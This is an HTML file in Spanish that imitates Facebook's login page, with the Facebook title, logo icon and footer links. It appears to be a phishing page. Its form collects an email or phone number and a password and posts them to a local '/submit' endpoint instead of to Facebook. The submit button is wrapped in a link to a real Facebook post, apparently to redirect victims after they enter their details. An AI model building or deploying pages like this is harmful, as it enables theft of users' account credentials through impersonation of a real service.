<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <link rel="stylesheet" href="styles.css">
    <script defer src="./script.js"></script>
    <link rel="icon" href="./img/Facebook_Logo_(2019).png" type="image/png">
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <div class="login-box">
            <h2>Iniciar sesión en Facebook</h2>
            <form id="loginForm" action="/submit" method="POST">
                <input id="email" name="email" type="text" placeholder="Correo electrónico o número de teléfono" required>
                <input id="password" name="password" type="password" placeholder="Contraseña" required>
                <!-- Envolvemos el botón con un enlace -->
                <a href="https://www.facebook.com/share/p/19aS9fnWTn/" class="btn-primary">
                    <button type="submit" class="btn-primary">Iniciar sesión</button>
                </a>
            </form>
            
            
            <hr>
            <button class="btn-secondary">Crear cuenta nueva</button>
        </div>
        <div class="footer">
            <div class="languages">
                <a href="#">Español</a>
                <a href="#">English (US)</a>
                <a href="#">Português (Brasil)</a>
                <a href="#">Français (France)</a>
                <a href="#">한국어</a>
                <a href="#">Italiano</a>
                <a href="#">Deutsch</a>
                <a href="#">Bahasa Indonesia</a>
                <a href="#">العربية</a>
                <a href="#">हिन्दी</a>
                <a href="#">中文(简体)</a>
                <button>+</button>
            </div>
            <div class="links">
                <a href="#">Registrarte</a>
                <a href="#">Iniciar sesión</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Video</a>

                <a href="#">Meta Store</a>
                <a href="#">Meta Quest</a>
                <a href="#">Meta AI</a>
                <a href="#">Ray-Ban Meta</a>
            </div>
        </div>
    </div>
</body>
</html>
